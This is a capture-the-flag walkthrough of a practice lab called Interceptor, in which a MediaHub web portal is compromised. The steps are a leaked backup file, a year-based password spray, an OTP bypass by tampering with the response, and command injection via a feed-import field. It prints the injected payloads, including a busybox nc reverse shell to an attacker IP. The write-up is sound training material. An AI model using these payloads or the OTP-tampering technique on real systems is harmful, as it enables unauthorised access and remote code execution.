## Interceptor - THM
Oct 11, 2026 · @Gh0ulH4x
#### Description
- This walkthrough compromises **MediaHub**, an internal journalist content portal, by using Burp Suite to intercept and manipulate traffic: recovering a leaked admin credential hint from a `.bak` source file, brute-forcing the missing piece of the password, bypassing OTP verification by tampering with the API response body, and finally achieving command injection via a feed-import feature to get a reverse shell as `www-data`.
----
### Scenerio
| Item           | Value                                   |
| -------------- | --------------------------------------- |
| Target         | `http://10.49.160.121/`                 |
| Application    | MediaHub (PHP / Apache)                 |
| Initial access | None provided — black-box, proxy-driven |

---
## Enumeration
- Port Scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:92:b3:60:3c:b9:8d:ce:b5:d2:6a:d5:07:9c:5b:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAF+ybptlZDJTSrC6ATfMbjArvED/pv5tG0dgQ84jRZimTdsbXCv42s5KLIERIUV5JrJXfRs+M0yIZxQrhSsYyyrnLTmHEhOTMaiGx/jfIvUKhkBoHGeT6REcD7vC2EENGeI+CC7L8mztbQ39uXodVBnpBZ0aqUmF2VUsUbBenJxkB9dLU6TVPv1zxyQqsAQXLBksoPknhfmdxQWE6noXG+9rryZ2jk5cHhRIlrMgIh3ijh42yCZkvFX9YfGIWyek/zk04oXQAZZY2JVg61HadrnWREORcCKAkmht9UttdkNtNTzNMIekM4lOyI6EyO0A0ODBJxPZVlV23LaT5WRusUl350loK+LXXHxvc15/WHxeNfyosPCqxBA4aLNAyDmHJuhcRQSoJJhYIsrgSj+Da8OG8HwfhG41xLmwIIyE9A2KYWgRPkkvJAHme2hyBzoVOtDJhNvGFSKWd8ErDPQMiJqyJ6bkjLgkdqLxFvbDOEFLuzaGNXDCgHSKHxPHnlms=
|   256 0c:c3:52:0b:3c:d7:cc:39:61:dd:a3:be:8b:c0:78:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHkCNw8lWBUZB3vuJweCKIcTv4jtbgjLkFwa8OB91m8o850sTgKoamRh6SLGmbFtvCaj65g/mh2vNS0K6xg+2xA=
|   256 13:dd:8a:1c:a4:c0:d0:ee:9d:0b:65:25:07:b0:fc:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+MB+sm6+BMzZkfcLZL2U1Z67FJ8//yUExA689ad87J
53/tcp open  domain  syn-ack ttl 62 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MediaHub
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 0064983D530700270962E34818F1732E
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```
### Web Application — Port 80
- `MediaHub` presents a login page. Directory brute-forcing with extension fuzzing (`.php`, `.php.bak`, `.php~`) turned up a backup copy of the login page source:
```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://interceptor.thm' -x php,php.bak,php~ 
──────────────────────────────────────────────────
200  
403     
301       http://interceptor.thm/uploads => http://interceptor.thm/uploads/
200       http://interceptor.thm/uploads/avatar_1_79703589010e3b8f.png
301       http://interceptor.thm/assets => http://interceptor.thm/assets/
302       http://interceptor.thm/dashboard.php => login.php
200       http://interceptor.thm/assets/styles.css
200       http://interceptor.thm/assets/bootstrap.min.css
200       http://interceptor.thm/assets/bootstrap-icons.css
200       http://interceptor.thm/assets/jquery-3.6.3.js
200       http://interceptor.thm/footer.php
302       http://interceptor.thm/search.php => login.php
200       http://interceptor.thm/login.php
200       http://interceptor.thm/style.css
200       http://interceptor.thm/api_login.php
200       http://interceptor.thm/assets/core.js
200       http://interceptor.thm/assets/bootstrap.bundle.min.js
200       http://interceptor.thm/login.php.bak
200       http://interceptor.thm/assets/bootstrap-icons.woff
200       http://interceptor.thm/assets/bootstrap-icons.woff2
301       http://interceptor.thm/javascript => http://interceptor.thm/javascript/
```
- Leaked Credential Hint — `login.php.bak`
```bash
$ wget http://interceptor.thm/login.php.bak
$ cat login.php.bak
```
- The backup source file contained a developer comment left in from stagin
```
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
?>

<div class="row justify-content-center">
  <div class="col-md-5">
    <div class="card p-4">

      <h4 class="mb-3">Login</h4>

      <form id="loginForm">
        <input class="form-control mb-3" name="email" placeholder="Email" required>

        <input class="form-control mb-3" name="password" type="password" placeholder="Password" required>

        <button id="btnLogin" class="btn btn-primary w-100" type="submit">
          Login
        </button>
      </form>

      <div id="msg" class="mt-3"></div>

    </div>
  </div>
</div>

<script>
const form = document.getElementById("loginForm");
const msg  = document.getElementById("msg");
const btn  = document.getElementById("btnLogin");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  msg.innerHTML = `<div class="text-muted">Signing in...</div>`;
  btn.disabled = true;

  const payload = new FormData(form);

  try {
    const res = await fetch("api_login.php", {
      method: "POST",
      body: payload
    });

    const data = await res.json();

    if (!data.ok) {
      msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">${data.error}</div>`;
      btn.disabled = false;
      return;
    }

    msg.innerHTML = `<div class="alert alert-success py-2 mb-0">${data.message}</div>`;
    setTimeout(() => window.location = data.redirect, 400);

  } catch (err) {
    msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">Something went wrong.</div>`;
    btn.disabled = false;
  }
});
</script>

<?php include "footer.php"; ?>

```
- This gave a known username (`admin@mediahub.thm`) and a password format (`MediaHub` + a four-digit year), narrowing the keyspace to a short, generatable wordlist rather than a full brute force.
```bash
Email: admin@mediahub.thm
Password : MediaHub + any year
```
- Password Recovery
```bash
 for y in {1950..2026}; do echo "MediaHub$y" >> file.txt; done
```
- Spraying `file.txt` against the login form via Burp Intruder recovered the working password: `MediaHub2026.
## OTP Bypass via Response Tampering
- Logging in with the recovered credentials triggered an OTP verification step. Submitting an incorrect OTP returned a JSON response intercepted in Burp:
```req
HTTP/1.1 200 OK
Date: Sun, 11 Oct 2026 16:56:46 GMT
Server: Apache/2.4.41 (Ubuntu
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 66
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json


{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```
- Rather than brute-forcing the OTP itself, the response body was edited in-flight (Burp's "Response" tab / match-and-replace) to flip the verification flag directly:
- Body content change from `name` to `is_verified` and value is true at the place of OTP number
```req
HTTP/1.1 200 OK
Date: Sun, 11 Oct 2026 16:58:10 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 52
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json


{"ok":true,"message":"OTP verified. Redirecting..."}
```
- The client-side JS trusted this field blindly and redirected into the dashboard — the server-side OTP check was never actually satisfied, only the response the browser _saw_ was. This granted full admin access.
```bash
THM{ADMIN_ACCESS_USING_BURP}
```
----
### Privilege Escalation
- Dashboard have two entry points 
	- change picture and upload file format - JPG, PNG
	- Import feed which might be vulnerable so tried 
- The import feed field passed its input into a server-side command unsanitized:
```bash
http://google.com;$(id)
uid=33(www-data)
gid=33(www-data)
groups=33(www-data),1002(findgroup),1003(websql)
```
- Confirmed OS command injection. Upgrading to a reverse shell:
```bash
http://google.com;$(busybox nc 192.168.178.7 4444 -e sh)
# Got the rev-shell
# navigate to /var/www/user.txt
www-data@interceptor:/$ cd var
www-data@interceptor:/var$ cd www
www-data@interceptor:/var/www$ ls -la
total 16
drwxr-xr-x  3 root     root     4096 Mar  5  2026 .
drwxr-xr-x 16 root     root     4096 Apr 13  2025 ..
drwxrwsrwx  4 www-data www-data 4096 Mar  5  2026 html
-rw-rw-rw-  1 root     root       31 Mar  5  2026 user.txt
www-data@interceptor:/var/www$ cat user.txt
THM{SYSTEM_PWNED_SUCCESSFULLY}
```
- Flag
```Flag 
THM{SYSTEM_PWNED_SUCCESSFULLY}
```
### Attack Path Summary

1. Directory brute-forcing with backup-extension fuzzing (`.bak`) on MediaHub's login page recovers `login.php.bak`, which leaks a developer comment naming the admin email and a predictable password format (`MediaHub` + year).
2. Generating a small year-based wordlist and spraying it against the login form recovers the working admin password.
3. Logging in triggers an OTP step; intercepting the OTP-verification response in Burp and rewriting its JSON body (`is_verified: false` → `true`, with a success message) bypasses the check entirely, since the client trusts the response rather than re-validating server-side — yielding the first flag from the dashboard.
4. The dashboard's "import feed" feature passes user input unsanitized into a shell command, giving OS command injection as `www-data`; this is escalated to a full reverse shell and the user flag.

# END